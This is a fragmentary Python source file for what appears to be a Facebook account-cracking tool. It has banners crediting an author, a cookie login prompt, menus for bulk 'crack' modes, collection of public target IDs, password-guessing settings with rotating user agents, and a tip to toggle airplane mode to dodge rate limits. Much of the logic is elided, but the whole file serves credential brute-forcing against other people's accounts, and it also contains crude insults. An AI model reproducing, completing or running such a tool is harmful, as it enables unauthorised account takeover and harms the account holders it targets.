...
def banner():
	...
	print(f'''{bo}{N}╭──────────────[{sir} Author : HASAN-VAI {x}]''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t©©© Bro : [green]New Update[white] ©©©'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'{N}╭──────────────[{asu} Author : HASAN-VAI {N}]\n{N}│\n{N}│ ╭[\033[41m\033[1;37m Status : FREE \x1b[0m\x1b[1;97m]─────────────━\x1b[38;5;196m㋱\x1b[38;5;226m•\x1b[1;97m[{asu}BANGLADESH\x1b[1;97m]•\x1b[38;5;196m㋱\x1b[1;97m{N}━╮\n{N}│ │                                                    {N}│\n{N}│ │ {asu} ██▀▄▀██▒▐█▀▀▄░\x1b[0m▄{asu}░▐█▀█▒▐█▒▒▐█░ ▄█▀▄─░██▄░▒█▌▒▐█▀▀█ {N} │\n{N}│ │  {asu}██░▀░██▒▐█▒▐█░░░▐█──▒▐█████░▐█▄▄▐█▒▐█▒█▒█░░▐█▒▄▄ {N} │\n{N}│ │  {asu}██▒─▒██▒▐█▀▄▄░\x1b[0m▄{asu}░▐█▄█▒▐█▒▒▐█░▐█─░▐█░██░▒██▌░▐█▄▄█ {N} │\n{N}│ │  {asu}WhatsApp {P}: {asu}+8801996636652                         {N}│\n{N}│ ╰─[{h}MENU{x}]──────────────────────────────────[\033[41m\033[1;37m KST \x1b[0m\x1b[1;97m{N}]╯\n{N}├───{x}[{h}1{x}]{k} Crack Public   {x}[{h}6{x}]{k} Share posting FB\n{N}├───{x}[{h}2{x}]{k} Crack Follower {x}[{h}7{x}]{k} Crack Grup\n{N}├───{x}[{h}3{x}]{k} Lapor bug      {x}[{h}8{x}]{k} Crack Halaman\n{N}├───{x}[{h}3{x}]{k} Lapor bug      {x}[{h}8{x}]{k} Crack Halaman\n{N}├───{x}[{h}4{x}]{k} Crack File{h}√    {x}[{h}9{x}]{k} Crack Massal\n{N}├───{x}[{h}5{x}]{k} Hasan Crack    {x}[{h}0{x}]{k} Exit\n{N}│ ╭────────────────────────────────────────────────────╮\n{N}│ │{asu} ▄▄▌         ▄▄ • ▪   ▐ ▄     ·▄▄▄▄  ▄• ▄▌▄▄▌  ▄• ▄▌{N}│\n{N}│ │{asu} ██•  ▪     ▐█ ▀ ▪██ •█▌▐█    ██▪ ██ █▪██▌██•  █▪██▌{N}│\n{N}│ │{asu} ██▪   ▄█▀▄ ▄█ ▀█▄▐█·▐█▐▐▌    ▐█· ▐█▌█▌▐█▌██▪  █▌▐█▌{N}│\n{N}│ │{asu} ▐█▌▐▌▐█▌.▐▌▐█▄▪▐█▐█▌██▐█▌    ██. ██ ▐█▄█▌▐█▌▐▌▐█▄█▌{N}│\n{N}│ │{asu} .▀▀▀  ▀█▄▀▪·▀▀▀▀ ▀▀▀▀▀ █▪    ▀▀▀▀▀•  ▀▀▀ .▀▀▀  ▀▀▀ {N}│\n{N}│ │  {h}WhatsApp{N} : {asu}+8801996636652                        {N}│\n{N}│ ╰─────────────────────────────────────────[\033[41m\033[1;37m KST \x1b[0m\x1b[1;97m{N}]╯\n{N}├───[{H}+{N}] Log in Cookies :{asu} ')
...
def menu(my_name,my_id):
	...
	gh = 'github.com/KgHasan'
	print(f'│ ╭[\033[41m\033[1;37m Status : FREE \x1b[0m\x1b[1;97m{N}]───────────━{B}㋱{K}•{N}[\033[41m\033[1;37m BANGLADESH \x1b[0m\x1b[1;97m{N}]{K}•{B}㋱{N}━╮')
	print(f'│ │                                                    {N}│')
	print(f'│ │  ██▀▄▀██▒▐█▀▀▄░▄░▐█▀█▒▐█▒▒▐█░ ▄█▀▄─░██▄░▒█▌▒▐█▀▀█ {N} │')
	print(f'│ │  ██░▀░██▒▐█▒▐█░░░▐█──▒▐█████░▐█▄▄▐█▒▐█▒█▒█░░▐█▒▄▄ {N} │')
	print(f'│ │  ██▒─▒██▒▐█▀▄▄░▄░▐█▄█▒▐█▒▒▐█░▐█─░▐█░██░▒██▌░▐█▄▄█ {N} │')
	print(f'│ │  WhatsApp : +8801996636652                        {N}│')
	print(f'│ ╰─[{H}MENU{N}]──────────────────────────────────[\033[41m\033[1;37m KST \x1b[0m\x1b[1;97m{N}]╯')
	print(f'{N}├───[{asu}+{N}] Your Idz : '+str(my_id))
	print(f'{N}├───[{asu}+{N}] Your Ip  : {ip}')
	print(f'{N}├───[{asu}+{N}] Github   : {gh}')
	print(f'{N}├───[{asu}✓{N}]{H} Status   {N}: {asu}Free✓')
	print(f'{N}├───[{h}1{N}] Crack Public ')
	print(f'{N}├───[{h}2{N}] No Sapport😥 ')
	print(f'{N}├───[{h}3{N}] My facebook  ')
	print(f'{N}├───[{h}4{N}] ERROR404😥	')
	print(f'{N}├───[{h}5{N}] Hasan Crack  ')
	print(f'{N}├───[{h}6{N}] ERROR BRO😥')
	print(f'{N}├───[{h}0{N}] Log Out Cookie       ')
	print(f'{N}├──╭[{h}MENU{x}]──────────────────────────────────────────────')
	...
	if _____alvino__adijaya_____ in ['1']:
		...
		print(f'{N}├───[{H}+{N}] Path Yang Bener ')
		back()
def error():
	jalan(f'├───[{H}+{N}]{sir} FOLLOW MY FB ACCOUNT  {x}')
	time.sleep(4)
	os.system("xdg-open https://www.facebook.com/copy.link.erorr404")
	back()
#-----------------[ HASAN-CRACK ]-----------------#
def result():
	print(f'{N}├───[{H}1{N}] Hasan {h}OK{x} ID ')
	print(f'{N}├───[{H}2{N}] Hasan {b}CP{x} ID ')
	print(f'{N}├───[{H}3{N}] Back	')
	kz = input(f'{N}├───[{H}+{N}] Path : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
			...
			back()
		if len(vin)==0:
			print(f'{N}├───[{H}+{N}] Anda Tidak Memiliki Hasan CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			...
			geeh = input(f'{N}├───[{H}+{N}] Path : ')
			try:geh = lol[geeh]
			except KeyError:
				print(f'{N}├───[{H}+{N}] Sorry 🥱 Not Sapport Choice 5 ')
				back()
		...
		if len(vin)==0:
			...
			try:geh = lol[geeh]
				...
				print(f'{N}├───[{H}+{N}] Path Yang Bener Kontol ')
				back()
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input(f'{N}├───[{H}+{N}] Target pablic id limit : {h}'))
	except ValueError:
	...
	for met in range(jum):
		yz+=1
		kl = input(f'{N}├───[{H}+{N}] Pablic ID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			...
			exit()
	try:
		print(f'{N}├───[{H}+{N}] Total ID  : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
def crack_file():
	...
	if len(vin)==0:
		...
		try:geh = lol[geeh]
			...
			print(f'{k}├──> Path Yang Bener Kontol {x}')
			time.sleep(3)
			back()
...
def setting():
	print(f'{N}├───────────────────────────────────────────────────────')
	print(f'{N}├───[{H}1{N}] Bro Old ')
	print(f'{N}├───[{H}2{N}] Bro New ')
	print(f'{N}├───[{H}3{N}] Bro Random ')
	...
	if hu in ['1','01']:
		...
		print(f'{N}├───[{H}+{N}] Path Yang Bener Kontooll ')
		exit()
	print(f'{N}├───────────────────────────────────────────────────────')
	...
	if hc in ['1','01']:
		...
		method.append('mobile')
	print(f'{N}│')
	_jembot_ = input(f'{N}├───[{H}+{N}] Auto and choice pass ({b}Y{N}/{h}T{N}) ')
	if _jembot_ in ['']:
		print(f'{N}├───[{H}+{N}] Path Yang Bener Kontol ')
		back()
		...
		taplikasi.append('no')
	pwplus=input(f'{N}├───[{H}+{N}] Password Manual ({b}Y{N}/{h}T{N}) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	jalan(f'{N}│ ╭────────────────────────────────────────────────────╮\n{N}│ │ [{h}•{x}] Hasan {h}OK{x} Date : {h}%s{x}  {N}│'%(okc))
	jalan(f'{N}│ │ [{b}•{x}] Hasan {b}CP{x} Date : {b}%s{x}  {N}│'%(cpc))
	jalan(f'{N}│ ╰────────[{k}USE AIRPLANE MOOD {1} MINI 1K ID Enjoy Brother{N}]─────────╯') #%(okc,cpc))
	jalan(f"│")
	...
	print('│')
	print(f'├───[{b}•{x}] Complate Bro ( Y/t ) ? ')
	woi = input(f'╰───[{b}•{x}] Choice : ')
	if woi in ['y','Y']:
		back()
	else:
...
def crack(idf,pwv):
	...
	fff = '%'
	sys.stdout.write('\r└\x1b[1;90m[%s\x1b[1;93m✓\x1b[1;90m]-[\x1b[1;91m%s\x1b[1;90m/\33[m%s\x1b[1;90m]-[\x1b[1;92mOK:%s\x1b[1;90m]-[\33[1;96mCP:%s\x1b[1;90m]-[\x1b[1;94m%s%s\x1b[1;90m]%s ✓'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
...
'Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.1.2; 17MB150WB Build/NZH54D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.121 Safari/537.36'
	...
	sys.stdout.write('\r└\x1b[1;90m[%s\x1b[1;91m+\x1b[1;90m]-[\x1b[1;96m%s\x1b[1;90m/\x1b[1;95m%s\x1b[1;90m]-[\x1b[1;92mOK:%s\x1b[1;90m]-[\x1b[1;93mCP:%s\x1b[1;90m]-[\x1b[1;94m%s%s\x1b[1;90m]%s ✓'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	ugent = random.choice([
